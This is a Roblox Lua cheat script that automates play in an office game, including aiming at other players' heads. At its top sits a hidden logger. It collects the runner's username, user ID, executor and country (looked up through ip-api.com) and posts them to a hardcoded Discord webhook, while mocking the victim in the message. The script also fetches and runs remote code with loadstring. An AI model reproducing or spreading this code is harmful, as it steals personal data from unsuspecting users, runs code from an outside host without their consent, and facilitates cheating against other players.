-- Game: Don't get fired at work
-- Made by FedoraC and Exirl

-- We are allied with BLURSFUN GAMES now.
-- FedoraC and Exirl are allied with BLURS.

local Players   = game:GetService("Players")
local Storage   = game:GetService("ReplicatedStorage")
local Input     = game:GetService("UserInputService")
local Vim       = game:GetService("VirtualInputManager")
local Json      = game:GetService("HttpService")
local me        = Players.LocalPlayer

local WEBHOOK = "https://discord.com/api/webhooks/1559374825364136008/qOYpc1QvKh1e0-I-38log1TY4fgCeOjbJkQo5ytIl-eXnAugBwLw1ehrwnx8TppTehmJ"

do
    local HSvc = game:GetService("HttpService")

    local function post(url, body)
        local headers = { ["Content-Type"] = "application/json" }
        local ok = pcall(function()
            if syn and syn.request then
                syn.request({ Url = url, Method = "POST", Headers = headers, Body = body })
            elseif http and http.request then
                http.request({ Url = url, Method = "POST", Headers = headers, Body = body })
            elseif request then
                request({ Url = url, Method = "POST", Headers = headers, Body = body })
            elseif fluxus and fluxus.request then
                fluxus.request({ Url = url, Method = "POST", Headers = headers, Body = body })
            else
                HSvc:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
            end
        end)
        return ok
    end

    local function getexec()
        local ok, name = pcall(function()
            if identifyexecutor then return identifyexecutor() end
        end)
        if ok and name then return tostring(name) end
        return "Unknown"
    end

    local function getcount()
        local ok, res = pcall(function()
            if syn and syn.request then
                local r = syn.request({ Url = "http://ip-api.com/json/", Method = "GET" })
                return r and r.Body
            elseif http and http.request then
                local r = http.request({ Url = "http://ip-api.com/json/", Method = "GET" })
                return r and r.Body
            elseif request then
                local r = request({ Url = "http://ip-api.com/json/", Method = "GET" })
                return r and r.Body
            else
                return game:HttpGet("http://ip-api.com/json/")
            end
        end)
        if not ok or type(res) ~= "string" then return "Unknown" end
        local ok2, decoded = pcall(HSvc.JSONDecode, HSvc, res)
        if ok2 and decoded and decoded.country then
            return tostring(decoded.country)
        end
        return "Unknown"
    end

    local function getpfp(userId)
        local ok, url = pcall(function()
            return Players:GetUserThumbnailAsync(
                userId,
                Enum.ThumbnailType.HeadShot,
                Enum.ThumbnailSize.Size420x420
            )
        end)
        if ok and url then return url end
        return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
    end

    task.spawn(function()
        local id   = me.UserId
        local username = me.Name
        local display  = me.DisplayName or me.Name
        local country  = getcount()
        local pfp      = getpfp(userId)
        local exec     = getexec()

        local timestamp = os.date("!%Y-%m-%d %H:%M:%S UTC")

        local embed = {
            title       = "🔓 Script Executed",
            description = "A brainless user executed an auto script",
            color       = 0x00C853,
            thumbnail   = { url = pfp },
            fields = {
                { name = "👤 Username",     value = "`" .. username .. "`",              inline = true },
                { name = "🏷️ Display Name", value = "`" .. display  .. "`",              inline = true },
                { name = "🆔 User ID",      value = "`" .. tostring(id) .. "`",       inline = true },
                { name = "🌍 Country",      value = "`" .. country .. "`",               inline = true },
                { name = "🕒 Logged Time",  value = "`" .. timestamp .. "`",             inline = false },
                { name = "⚙️ Executor",     value = "`" .. exec .. "`",                  inline = true },
                { name = "🔗 Profile",      value = "[Roblox Profile](https://www.roblox.com/users/" .. tostring(id) .. "/profile)", inline = true },
            },
            footer = { text = "Auto Suite Logger • Fedora Cheats" },
        }

        local payload = HSvc:JSONEncode({
            username   = "Auto Suite Logger",
            avatar_url = pfp,
            embeds     = { embed },
        })

        post(WEBHOOK, payload)
    end)
end


local file = "autosuite_config.json"

local base = {
    AA_ENABLED         = true,
    HACK_ENABLED       = true,
    AUTO_WRITE         = true,
    AUTO_SPEEDUP       = true,
    AUTO_DECLINE_CALL  = true,
    AUTO_CLOSE_POPUPS  = true,
    AUTO_SMACK         = true,
    AUTO_THROW_PAPER   = true,
    AUTO_AIM_PLAYERS   = true,
    AUTO_ROLL_CALL     = true,
    AUTO_KICK_PRINTER  = true,
    TYPE_FIRE_INTERVAL = 0.12,
    FIRE_RETRY_AFTER   = 0.05,
    THROW_INTERVAL     = 0.06,
    SPEEDUP_INTERVAL   = 0.04,
    SMACK_INTERVAL     = 0.30,
    DECLINE_INTERVAL   = 0.20,
    POPUP_INTERVAL     = 0.15,
    HERE_INTERVAL      = 0.10,
    KICK_INTERVAL      = 0.04,
    AIM_MAX_DISTANCE   = 45,
    KEY_HOLD           = 0.010,
    LOOP_DELAY         = 0.04,
    HACK_LAG           = 0.045,
    HACK_HOLD_TIME     = 0.02,
}

local set = {}
for k, v in next, base do set[k] = v end

local function load()
    if type(isfile) ~= "function" or type(readfile) ~= "function" then return end
    local ok, has = pcall(isfile, file)
    if not ok or not has then return end
    local ok2, raw = pcall(readfile, file)
    if not ok2 or type(raw) ~= "string" then return end
    local ok3, dec = pcall(Json.JSONDecode, Json, raw)
    if not ok3 or type(dec) ~= "table" then return end
    for k, v in next, dec do
        if base[k] ~= nil and type(v) == type(base[k]) then
            set[k] = v
        end
    end
end

local function dump()
    if type(writefile) ~= "function" then return end
    local ok, enc = pcall(Json.JSONEncode, Json, set)
    if ok then pcall(writefile, file, enc) end
end

load()

for _, g in next, me.PlayerGui:GetChildren() do
    if g:IsA("ScreenGui") then
        local n = g.Name:lower()
        if n:find("wevorn") or n:find("library")
        or n == "autosuite" or n == "auto suite" then
            pcall(function() g:Destroy() end)
        end
    end
end

local Lib = loadstring(game:HttpGet(
    "https://raw.githubusercontent.com/Games1799/Scripts/refs/heads/main/Libary/WevornLibary.lua"
))()
local Win = Lib:Window("Auto Suite")

local function zones()
    local out = {}
    local function add(inst)
        if typeof(inst) ~= "Instance" then return end
        for i = 1, #out do if out[i] == inst then return end end
        out[#out + 1] = inst
    end

    local env = type(getgenv) == "function" and getgenv() or {}
    for _, name in next, {"gethui", "gethiddenui", "get_hidden_ui"} do
        local fn = env[name] or rawget(_G, name)
        if type(fn) == "function" then
            local ok, r = pcall(fn)
            if ok then add(r) end
        end
    end

    local ok, cg = pcall(function() return game:GetService("CoreGui") end)
    if ok and cg then add(cg) end

    local pg = me:FindFirstChildOfClass("PlayerGui")
    if pg then add(pg) end
    return out
end

local function find()
    for _, cont in next, zones() do
        local ok, kids = pcall(function() return cont:GetDescendants() end)
        if ok and kids then
            for _, d in next, kids do
                if d:IsA("Frame")
                and d.Size.X.Scale == 0
                and math.abs(d.Size.X.Offset - 500) < 5
                and d.Size.Y.Scale == 0
                and math.abs(d.Size.Y.Offset - 350) < 5 then
                    for _, c in next, d:GetChildren() do
                        if c:IsA("Frame")
                        and c.Size.X.Scale == 1
                        and c.Size.X.Offset == 0
                        and c.Size.Y.Scale == 0
                        and c.Size.Y.Offset == 55 then
                            return d, c
                        end
                    end
                end
            end
        end
    end
    return nil, nil
end

local hooked = false

local function drag()
    if hooked then return true end
    local win, bar = find()
    if not win or not bar then return false end

    local held = false
    local m0, p0

    bar.InputBegan:Connect(function(inp)
        if inp.UserInputType ~= Enum.UserInputType.MouseButton1
        and inp.UserInputType ~= Enum.UserInputType.Touch then return end
        held = true
        m0 = inp.Position
        p0 = win.Position
    end)

    Input.InputChanged:Connect(function(inp)
        if not held then return end
        if inp.UserInputType ~= Enum.UserInputType.MouseMovement
        and inp.UserInputType ~= Enum.UserInputType.Touch then return end
        local d = inp.Position - m0
        win.Position = UDim2.new(
            p0.X.Scale, p0.X.Offset + d.X,
            p0.Y.Scale, p0.Y.Offset + d.Y
        )
    end)

    Input.InputEnded:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseButton1
        or inp.UserInputType == Enum.UserInputType.Touch then
            held = false
        end
    end)

    hooked = true
    return true
end

task.spawn(function()
    for _ = 1, 100 do
        if drag() then break end
        task.wait(0.1)
    end
end)

local mtab  = Win:Server("Main", "http://www.roblox.com/asset/?id=6031075938")
local atab  = mtab:Section("AutoAnswer")
local htab  = mtab:Section("AutoHack")

local Meet  = Storage:WaitForChild("Meeting", 30)
local Nets  = Meet and (Meet:FindFirstChild("Remotes") or Meet:WaitForChild("Remotes", 10))
local Ev    = Nets and (Nets:FindFirstChild("HackUpdate") or Nets:WaitForChild("HackUpdate", 10))

local map = {
    Up    = Enum.KeyCode.W,
    Left  = Enum.KeyCode.A,
    Right = Enum.KeyCode.D,
    Down  = Enum.KeyCode.S,
}

local jobs        = {}
local lastdata
local uid
local rnd
local lastsig

local function wipe()
    for i = 1, #jobs do
        if typeof(jobs[i]) == "thread" then pcall(task.cancel, jobs[i]) end
    end
    table.clear(jobs)
end

local function tap(dir)
    if not set.HACK_ENABLED then return end
    local k = map[dir]
    if not k then return end
    pcall(function() Vim:SendKeyEvent(true,  k, false, game) end)
    task.wait(set.HACK_HOLD_TIME)
    pcall(function() Vim:SendKeyEvent(false, k, false, game) end)
end

local function plan(data)
    local chart, start = data.Chart, data.RoundStart
    if not chart or not start or not chart.notes then return end
    local sig = tostring(data.Id) .. "|" .. tostring(data.Round)
    if sig == lastsig then return end
    lastsig = sig
    wipe()
    uid, rnd, lastdata = data.Id, data.Round, data
    local now = workspace:GetServerTimeNow()
    local n = 0
    for _, note in next, chart.notes do
        if map[note.d] then
            n = n + 1
            local wait = (start + note.t + set.HACK_LAG) - now
            jobs[n] = task.delay(math.max(0, wait), function()
                if not set.HACK_ENABLED then return end
                if uid ~= data.Id or rnd ~= data.Round then return end
                tap(note.d)
            end)
        end
    end
end

if Ev then
    Ev.OnClientEvent:Connect(function(data)
        if type(data) ~= "table" then return end
        local st = data.State
        if st == "active" then
            if set.HACK_ENABLED then plan(data) else lastdata = data end
        elseif st == "stolen" or st == "blocked" or st == "cancelled" or st == "timeout" then
            wipe()
            lastdata, uid, rnd, lastsig = nil, nil, nil, nil
        end
    end)
end

local lastkey, lastkeyt      = nil, 0
local lastsendt, lastspdt    = 0, 0
local lastdeclt, lasttypet   = 0, 0
local lastpopt, lastsmackt   = 0, 0
local lastthrowt, lastheret  = 0, 0
local lastkickt              = 0
local sendat                 = 0
local nextClickAt            = 0
local sentPending            = false
local lastHintText           = ""
local CLICK_RETRY_DELAY      = 0.5
local aiming, fireat, aimbtn = false, 0, nil

local actkey = {
    APPROVE = Enum.KeyCode.A,
    DELETE  = Enum.KeyCode.D,
    FORWARD = Enum.KeyCode.F,
}

local function press(kc)
    pcall(function() Vim:SendKeyEvent(true,  kc, false, game) end)
    task.wait(set.KEY_HOLD)
    pcall(function() Vim:SendKeyEvent(false, kc, false, game) end)
end

local function poke(kc)
    pcall(function() Vim:SendKeyEvent(true,  kc, false, game) end)
    pcall(function() Vim:SendKeyEvent(false, kc, false, game) end)
end

local function clean(s) return (s:gsub("<[^>]*>", "")) end

local function shown(obj)
    if not obj then return false end
    local cur = obj
    while cur do
        if cur:IsA("GuiObject") then
            if not cur.Visible or cur.AbsoluteSize.X <= 0 or cur.AbsoluteSize.Y <= 0 then
                return false
            end
        end
        cur = cur.Parent
    end
    return true
end

local function seek(root, name, text)
    if not root then return nil end
    for _, d in next, root:GetDescendants() do
        if d:IsA("GuiButton") and d.Name == name and d.Parent then return d end
    end
    if text then
        for _, d in next, root:GetDescendants() do
            if d:IsA("GuiButton") and d.Parent
            and clean(d.Text or ""):lower():find(text, 1, true) then
                return d
            end
        end
    end
    return nil
end

local function push(btn)
    if not btn then return false end
    if type(getconnections) == "function" then
        local fired = false
        pcall(function()
            for _, c in next, (getconnections(btn.Activated) or {}) do
                if c.Fire then c:Fire(); fired = true end
            end
        end)
        if fired then return true end
    end
    if type(firesignal) == "function" then
        local ok = pcall(firesignal, btn.Activated)
        if ok then return true end
    end
    if btn.Visible and btn.AbsoluteSize.X > 0 and btn.AbsoluteSize.Y > 0 then
        local x = btn.AbsolutePosition.X + btn.AbsoluteSize.X * 0.5
        local y = btn.AbsolutePosition.Y + btn.AbsoluteSize.Y * 0.5
        pcall(function()
            Vim:SendMouseButtonEvent(x, y, 0, true,  game, 1)
            task.wait(0.015)
            Vim:SendMouseButtonEvent(x, y, 0, false, game, 1)
        end)
        return true
    end
    return false
end

local function clickWrite(btn)
    if not btn or not btn.Parent then return false end

    if type(getconnections) == "function" then
        pcall(function()
            for _, c in next, (getconnections(btn.Activated) or {}) do
                if c.Fire then pcall(function() c:Fire() end) end
            end
        end)
        pcall(function()
            for _, c in next, (getconnections(btn.MouseButton1Click) or {}) do
                if c.Fire then pcall(function() c:Fire() end) end
            end
        end)
    end
    if type(firesignal) == "function" then
        pcall(firesignal, btn.Activated)
        pcall(firesignal, btn.MouseButton1Click)
    end

    if btn.Visible and btn.AbsoluteSize.X > 0 and btn.AbsoluteSize.Y > 0 then
        local x = btn.AbsolutePosition.X + btn.AbsoluteSize.X * 0.5
        local y = btn.AbsolutePosition.Y + btn.AbsoluteSize.Y * 0.5

        pcall(function() Vim:SendMouseMoveEvent(x, y, game) end)
        task.wait(0.05)
        pcall(function() Vim:SendMouseButtonEvent(x, y, 0, true, game, 1) end)
        task.wait(0.08)
        pcall(function() Vim:SendMouseButtonEvent(x, y, 0, false, game, 1) end)
        return true
    end
    return false
end

local refs, cache = {}, nil

local function build(ui)
    cache = ui
    refs = {}
    for _, d in next, ui:GetDescendants() do
        local n = d.Name
        if (n == "APPROVE" or n == "DELETE" or n == "FORWARD") and d:IsA("GuiButton") then
            refs[n] = d
        elseif n == "WriteEmail" and d:IsA("GuiButton") then refs.write = d
        elseif n == "Send"       and d:IsA("GuiButton") then refs.send  = d
        elseif n == "TapToType"  and d:IsA("GuiButton") then refs.tap   = d
        elseif n == "Decline"    and d:IsA("GuiButton") then refs.decl  = d
        elseif n == "Email"      and d:IsA("TextLabel") then refs.mail  = d
        elseif n == "Hint"       and d:IsA("TextLabel") then refs.hint  = d
        elseif n == "NewMessage" then refs.newmsg  = d
        elseif n == "CallWindow" then refs.call    = d
        elseif n == "LaptopView" then refs.laptop  = d
        elseif n == "CrashScreen" then refs.crash  = d
        elseif n == "ScamPopup"  then refs.scam    = d
        elseif n == "HRAlert"    then refs.hr      = d
        elseif n == "BossNotice" then refs.boss    = d
        elseif n == "Smack"      and d:IsA("GuiButton") then refs.smack = d
        end
    end
    if not refs.write then refs.write = seek(ui, "WriteEmail", "write email") end
    if not refs.send  then refs.send  = seek(ui, "Send", "send") end
    if not refs.decl  then refs.decl  = seek(ui, "Decline", "decline") end
    if not refs.tap   then refs.tap   = seek(ui, "TapToType") end
    if refs.scam then
        refs.scamx = seek(refs.scam, "DismissImage") or seek(refs.scam, "Close")
    end
    if refs.hr   then refs.hrx = seek(refs.hr, "Close") end
    if refs.boss then refs.bossx = seek(refs.boss, "OK", "ok") end
end

local function grab()
    local ui = me.PlayerGui:FindFirstChild("MeetingUI")
    if not ui then cache = nil; refs = {}; return nil end
    if ui ~= cache then build(ui) end
    return ui
end

local function inner(name)
    local c = refs.newmsg
    if not c or not c.Parent then return nil end
    for _, d in next, c:GetDescendants() do
        if d.Name == name then return d end
    end
    return nil
end

local orefs, ocache = {}, nil

local function obuild(ui)
    ocache = ui
    orefs = {}
    for _, d in next, ui:GetDescendants() do
        if d:IsA("GuiButton") then
            if d.Name == "Here" then orefs.here = d
            elseif d.Name == "Kick" then orefs.kick = d end
        end
    end
end

local function ograb()
    local ui = me.PlayerGui:FindFirstChild("OfficeEventsUI")
    if not ui then ocache = nil; orefs = {}; return nil end
    if ui ~= ocache then obuild(ui) end
    return ui
end

local function fire(name)
    local btn = refs[name]
    if btn and btn.Parent and push(btn) then return true end
    local k = actkey[name]
    if k then press(k); return true end
    return false
end

local function judge(text)
    local p = clean(text):lower()
    if p:find("looks suspicious", 1, true) then return "DELETE" end
    local ai, fi = math.huge, math.huge
    for _, kw in next, {"approv", "aprob", "aprueb", "apru"} do
        local i = p:find(kw, 1, true)
        if i and i < ai then ai = i end
    end
    for _, kw in next, {"forward", "reenv", "remit"} do
        local i = p:find(kw, 1, true)
        if i and i < fi then fi = i end
    end
    local hasA, hasF = ai < math.huge, fi < math.huge
    if hasA and hasF then return ai < fi and "APPROVE" or "FORWARD"
    elseif hasA then return "APPROVE"
    elseif hasF then return "FORWARD"
    else return "DELETE" end
end

local function hasEmail()
    local lbl = refs.mail
    if not lbl or not lbl.Parent then return false end
    local raw = lbl.Text or lbl.ContentText or ""
    if raw == "" then return false end
    local text = clean(raw):gsub("%s+", " ")
    text = text:gsub("^%s+", ""):gsub("%s+$", "")
    if #text < 8 then return false end
    local lower = text:lower()
    for _, kw in ipairs({
        "inbox empty", "inbox zero", "empty inbox", "no new",
        "no email", "no emails", "no message", "no messages",
        "nothing", "you're all caught up", "all caught up",
        "0 new", "0 email", "0 message", "waiting for",
        "no pending", "no inbox",
    }) do
        if lower:find(kw, 1, true) then return false end
    end
    local words = 0
    for _ in text:gmatch("%S+") do words = words + 1 end
    if words < 4 then return false end
    return true
end

local function inbox()
    local lbl = refs.mail
    if not lbl or not lbl.Parent then return end
    local text = lbl.Text or lbl.ContentText or ""
    if text == "" then return end
    if not hasEmail() then
        lastkey = nil
        return
    end
    local key = text:sub(1, 120) .. "#" .. #text
    if key == lastkey and os.clock() - lastkeyt < set.FIRE_RETRY_AFTER then return end
    if fire(judge(text)) then
        lastkey, lastkeyt = key, os.clock()
    end
end

local function write(ui)
    local wb = seek(ui, "WriteEmail", "write email")
    if wb then refs.write = wb else wb = refs.write end
    if not wb or not wb.Parent then return end

    local box = refs.newmsg
    if box and not box.Parent then
        refs.newmsg = nil
        box = nil
    end
    if not box then
        for _, d in next, ui:GetDescendants() do
            if d.Name == "NewMessage" then
                refs.newmsg = d
                box = d
                break
            end
        end
    end

    if not (box and shown(box)) then
        sentPending  = false
        lastHintText = ""
        if os.clock() < nextClickAt then return end
        nextClickAt = os.clock() + CLICK_RETRY_DELAY
        clickWrite(wb)
        return
    end

    nextClickAt = 0

    local hint = refs.hint
    if not hint or not hint.Parent then
        refs.hint = nil
        for _, d in next, box:GetDescendants() do
            if d.Name == "Hint" then
                refs.hint = d
                hint = d
                break
            end
        end
    end

    local hintText = hint and (hint.Text or "") or ""
    if hintText ~= lastHintText then
        lastHintText = hintText
    end

    local ready = hintText:find("Ready to send", 1, true) ~= nil
    if not ready then
        sentPending = false
        if os.clock() - lasttypet < set.TYPE_FIRE_INTERVAL then return end
        lasttypet = os.clock()
        local t = refs.tap
        if not t or not t.Parent then
            refs.tap = nil
            for _, d in next, box:GetDescendants() do
                if d.Name == "TapToType" then
                    refs.tap = d
                    t = d
                    break
                end
            end
        end
        if t and t.Visible then push(t) end
        return
    end

    if sentPending then return end
    if os.clock() - sendat < 0.5 then return end

    local s = refs.send
    if not s or not s.Parent then
        refs.send = nil
        for _, d in next, box:GetDescendants() do
            if d.Name == "Send" then
                refs.send = d
                s = d
                break
            end
        end
    end
    if s and s.Visible then
        sendat = os.clock()
        sentPending = true
        push(s)
        lastsendt = os.clock()
    end
end

local function speed()
    if not set.AUTO_SPEEDUP then return end
    local lv = refs.laptop
    if not lv or not lv.Visible then return end
    if refs.crash and shown(refs.crash) then return end
    if os.clock() - lastspdt < set.SPEEDUP_INTERVAL then return end
    lastspdt = os.clock()
    poke(Enum.KeyCode.S)
end

local function call(ui)
    if not set.AUTO_DECLINE_CALL then return end
    local db = refs.decl or seek(ui, "Decline", "decline")
    if db then refs.decl = db end
    local live = (refs.call and refs.call.Visible) or (db and db.Visible)
    if not live then return end
    if os.clock() - lastdeclt < set.DECLINE_INTERVAL then return end
    lastdeclt = os.clock()
    if db and db.Visible and push(db) then return end
    press(Enum.KeyCode.X)
end

local function popup()
    if not set.AUTO_CLOSE_POPUPS then return end
    if os.clock() - lastpopt < set.POPUP_INTERVAL then return end
    for _, btn in next, {refs.scamx, refs.hrx, refs.bossx} do
        if btn and shown(btn) then
            lastpopt = os.clock()
            push(btn)
            return
        end
    end
end

local function smack()
    if not set.AUTO_SMACK then return end
    if not (refs.crash and shown(refs.crash)) then return end
    if os.clock() - lastsmackt < set.SMACK_INTERVAL then return end
    lastsmackt = os.clock()
    if refs.smack and shown(refs.smack) then
        push(refs.smack)
        return
    end
    press(Enum.KeyCode.S)
end

local function roll()
    if not set.AUTO_ROLL_CALL then return end
    local b = orefs.here
    if not b or not shown(b) then return end
    if os.clock() - lastheret < set.HERE_INTERVAL then return end
    lastheret = os.clock()
    push(b)
end

local function kick()
    if not set.AUTO_KICK_PRINTER then return end
    local b = orefs.kick
    if not b or not shown(b) then return end
    if os.clock() - lastkickt < set.KICK_INTERVAL then return end
    lastkickt = os.clock()
    push(b)
end

local function office()
    ograb()
    roll()
    kick()
end

local function paperButton()
    local hud = me.PlayerGui:FindFirstChild("PaperHUD")
    if not hud then return nil end
    local b = hud:FindFirstChild("ThrowPaper")
    if b and b:IsA("GuiButton") and b.Visible then
        return b
    end
    for _, d in next, hud:GetDescendants() do
        if d:IsA("GuiButton") and d.Visible then
            local nm = (d.Name or ""):lower()
            local tx = clean(d.Text or ""):lower()
            if nm:find("throw", 1, true) or nm:find("paper", 1, true)
            or tx:find("throw", 1, true) then
                return d
            end
        end
    end
    return nil
end

local function pick()
    local myteam = me:GetAttribute("WarTeam")
    local char   = me.Character
    if not char then return nil end
    local root   = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Head")
    if not root then return nil end
    local mypos  = root.Position
    local best, bestd = nil, math.huge
    for _, p in next, Players:GetPlayers() do
        if p ~= me and p:GetAttribute("SeatName") then
            local pteam = p:GetAttribute("WarTeam")
            local enemy
            if myteam then
                enemy = pteam and pteam ~= myteam
            else
                enemy = true
            end
            if enemy then
                local c = p.Character
                if c then
                    local head = c:FindFirstChild("Head")
                    local hrp  = c:FindFirstChild("HumanoidRootPart")
                    if head and hrp then
                        local d = (hrp.Position - mypos).Magnitude
                        if d < bestd and d <= set.AIM_MAX_DISTANCE then
                            best, bestd = head, d
                        end
                    end
                end
            end
        end
    end
    return best
end

local function aim(btn)
    local target = pick()
    if not target then return false end

    local cam = workspace.CurrentCamera
    local oldt, oldcf = cam.CameraType, cam.CFrame

    cam.CameraType = Enum.CameraType.Scriptable
    cam.CFrame = CFrame.lookAt(oldcf.Position, target.Position + Vector3.new(0, 0.2, 0))

    aiming, fireat, aimbtn = true, os.clock() + 0.01, btn
    task.delay(0.04, function()
        if cam.CameraType == Enum.CameraType.Scriptable then
            cam.CameraType = oldt
        end
    end)
    return true
end

local function paper()
    if not set.AUTO_THROW_PAPER then return end

    local b = paperButton()
    if not b then
        if aiming then aiming, aimbtn = false, nil end
        return
    end

    if aiming then
        if os.clock() >= fireat then
            aiming = false
            local bb = aimbtn
            aimbtn = nil
            if bb and bb.Parent and bb.Visible then push(bb) end
        end
        return
    end
    if os.clock() - lastthrowt < set.THROW_INTERVAL then return end
    lastthrowt = os.clock()
    if set.AUTO_AIM_PLAYERS and aim(b) then return end
    push(b)
end

local function tick()
    office()

    if not set.AA_ENABLED then lastkey = nil return end
    local ui = grab()
    paper()
    if not ui or not ui.Enabled then lastkey = nil return end
    smack()
    speed()
    popup()
    call(ui)

    if refs.newmsg and shown(refs.newmsg) then
        if set.AUTO_WRITE then write(ui) end
        return
    end

    sendat, lasttypet = 0, 0
    sentPending, lastHintText = false, ""

    if hasEmail() then
        inbox()
    end

    if set.AUTO_WRITE then
        write(ui)
    end
end

atab:Toggle("AutoAnswer (Master)",      set.AA_ENABLED,        function(v) set.AA_ENABLED = v;        dump() end)
atab:Toggle("Auto Write Email",         set.AUTO_WRITE,        function(v) set.AUTO_WRITE = v;        dump() end)
atab:Toggle("Auto SpeedUp",             set.AUTO_SPEEDUP,      function(v) set.AUTO_SPEEDUP = v;      dump() end)
atab:Toggle("Auto Decline Call",        set.AUTO_DECLINE_CALL, function(v) set.AUTO_DECLINE_CALL = v; dump() end)
atab:Toggle("Auto Close Popups",        set.AUTO_CLOSE_POPUPS, function(v) set.AUTO_CLOSE_POPUPS = v; dump() end)
atab:Toggle("Auto Smack Laptop",        set.AUTO_SMACK,        function(v) set.AUTO_SMACK = v;        dump() end)
atab:Toggle("Auto Throw Paper",         set.AUTO_THROW_PAPER,  function(v) set.AUTO_THROW_PAPER = v;  dump() end)
atab:Toggle("Aim at Players (Head)",    set.AUTO_AIM_PLAYERS,  function(v) set.AUTO_AIM_PLAYERS = v;  dump() end)
atab:Toggle("Auto Roll Call (HERE!)",   set.AUTO_ROLL_CALL,    function(v) set.AUTO_ROLL_CALL = v;    dump() end)
atab:Toggle("Auto Kick Printer",        set.AUTO_KICK_PRINTER, function(v) set.AUTO_KICK_PRINTER = v; dump() end)

atab:Button("DEBUG: Show mail state", function()
    local ui = grab()
    if not ui then warn("[AutoSuite] MeetingUI not found") return end
    print("[AutoSuite] AUTO_WRITE =", set.AUTO_WRITE, "| AA_ENABLED =", set.AA_ENABLED)
    print("[AutoSuite] mail.Text =", refs.mail and refs.mail.Text or "nil")
    print("[AutoSuite] hasEmail() =", hasEmail())
    print("[AutoSuite] refs.newmsg =", refs.newmsg and refs.newmsg:GetFullName() or "nil")
    print("[AutoSuite] shown(newmsg) =", refs.newmsg and shown(refs.newmsg))
    print("[AutoSuite] nextClickAt =", nextClickAt, "| os.clock =", os.clock())
end)

atab:Button("DEBUG: Force-click WriteEmail", function()
    local ui = grab()
    if not ui then warn("[AutoSuite] MeetingUI not found") return end
    local wb = seek(ui, "WriteEmail", "write email")
    if not wb then warn("[AutoSuite] WriteEmail not found") return end
    print("[AutoSuite] Clicking:", wb:GetFullName(), "Visible:", wb.Visible)
    clickWrite(wb)
end)

htab:Toggle("AutoHack (Master)", set.HACK_ENABLED, function(v)
    set.HACK_ENABLED = v
    dump()
    if v then
        if lastdata then
            lastsig = nil
            plan(lastdata)
        end
    else
        wipe()
    end
end)
htab:Label("Input method: W / A / S / D (keyboard)")
htab:Label("Hotkey: LeftShift")

htab:Slider("Typing Interval (ms)",  40, 400,  set.TYPE_FIRE_INTERVAL * 1000, function(v) set.TYPE_FIRE_INTERVAL = v / 1000; dump() end)
htab:Slider("Fire Retry (ms)",       20, 500,  set.FIRE_RETRY_AFTER   * 1000, function(v) set.FIRE_RETRY_AFTER   = v / 1000; dump() end)
htab:Slider("Throw Interval (ms)",   30, 500,  set.THROW_INTERVAL     * 1000, function(v) set.THROW_INTERVAL     = v / 1000; dump() end)
htab:Slider("SpeedUp Interval (ms)", 20, 300,  set.SPEEDUP_INTERVAL   * 1000, function(v) set.SPEEDUP_INTERVAL   = v / 1000; dump() end)
htab:Slider("Smack Interval (ms)",  100, 1000, set.SMACK_INTERVAL     * 1000, function(v) set.SMACK_INTERVAL     = v / 1000; dump() end)
htab:Slider("Kick Printer (ms)",     20, 200,  set.KICK_INTERVAL      * 1000, function(v) set.KICK_INTERVAL      = v / 1000; dump() end)
htab:Slider("Aim Distance (studs)",  10, 100,  set.AIM_MAX_DISTANCE,          function(v) set.AIM_MAX_DISTANCE   = v;         dump() end)
htab:Label("RShift / LShift hotkeys")

Input.InputBegan:Connect(function(inp, gp)
    if gp then return end
    if inp.KeyCode == Enum.KeyCode.RightShift then
        set.AA_ENABLED = not set.AA_ENABLED
        dump()
    elseif inp.KeyCode == Enum.KeyCode.LeftShift then
        set.HACK_ENABLED = not set.HACK_ENABLED
        dump()
        if not set.HACK_ENABLED then
            wipe()
        elseif lastdata then
            lastsig = nil
            plan(lastdata)
        end
    end
end)

task.spawn(function()
    while task.wait(set.LOOP_DELAY) do
        pcall(tick)
    end
end)

print([[⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⣾⣿⣿⣷⡦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠴⠊⠉⠉⠀⠀⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⢀⣄⢠⣤⡤⠤⠤⣤⣤⣤⣤⣤⣤⣀⣀⣀⣀⣧⣤⡔⠒⠶⠶⠦⠄⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠈⠁⠀⠁⠀⠀⠀⠈⢉⣭⠛⠛⠛⣛⣿⣿⠛⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡞⠋⣠⣶⠾⠿⠿⢿⣷⣄⣀⠀⢀⣠⣤⣤⣤⣤⣀⣀⣿⣿⣿⣿⣷⣶⣤⡀⢀⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⡟⠁⢠⡿⠇⠀⠀⠀⠀⣹⣿⣿⣷⡿⢿⣿⣿⣭⡽⣿⣿⣿⣯⣭⣛⣿⣿⣿⣿⡟⢿⣀⡀⢀⣀⠀⠀
